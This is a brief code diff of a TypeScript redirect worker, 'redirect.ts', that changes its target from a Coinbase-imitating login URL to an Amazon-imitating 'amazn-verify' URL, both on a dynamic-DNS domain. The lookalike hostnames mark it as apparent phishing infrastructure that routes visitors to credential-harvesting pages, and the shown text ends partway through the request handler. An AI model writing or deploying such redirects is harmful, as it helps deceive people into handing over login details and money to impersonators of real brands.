@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://coinbase-secure.ath.cx/logon/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://amazn-verify.ath.cx/secure/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
